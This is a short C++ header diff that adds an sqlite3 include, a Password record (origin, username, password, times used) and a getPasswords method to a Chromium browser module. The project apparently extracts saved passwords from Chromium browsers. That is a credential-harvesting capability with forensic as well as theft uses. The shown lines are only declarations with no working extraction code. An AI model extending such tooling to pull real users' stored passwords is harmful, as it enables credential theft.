@@ -7,10 +7,21 @@
 
 
 #include "../ChromiumBrowserModule.h"
+#include "sqlite3.h"
+
+struct Password
+{
+    std::string origin;
+    std::string username;
+    std::string password;
+    int times_used;
+};
 
 class CPasswords : public ChromiumBrowserModule {
 public:
     void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
+private:
+    std::list<Password> getPasswords(const fs::path& db_path);
 };
 
 
